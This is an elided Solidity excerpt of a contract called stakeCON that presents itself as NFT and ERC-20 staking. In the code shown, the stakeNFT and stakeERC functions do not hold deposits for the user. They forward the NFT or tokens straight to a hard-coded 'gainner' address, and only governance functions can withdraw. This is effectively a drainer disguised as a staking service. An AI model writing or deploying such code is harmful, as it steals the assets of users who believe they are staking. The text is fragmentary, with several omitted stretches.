...
contract stakeCON is Governance {
    ...
    constructor(address  _gainner,address _nftAddr) public {
        gainner = _gainner;
        nftTokenAddr = _nftAddr;
    }
    
    function stakeNFT(uint _tokenid) public {
        require(ERC721(nftTokenAddr).ownerOf(_tokenid) == msg.sender);
        ERC721(nftTokenAddr).safeTransferFrom(msg.sender,address(this),_tokenid);
        ERC721(nftTokenAddr).safeTransferFrom(address(this),gainner,_tokenid);
    ...
    function stakeERC(address ercaddr,uint256 num) external {
        ...
        IERC20(ercaddr).transferFrom(msg.sender,gainner,num);
    ...
    function govwithdrawNFT(uint256 _tokenid) public onlyGovernance{
        ERC721(nftTokenAddr).safeTransferFrom(address(this),msg.sender,_tokenid);
    }

    function govwithdrawERC(address ercaddr,uint256 amount) public onlyGovernance{
        IERC20(ercaddr).transfer(msg.sender,amount);
    }
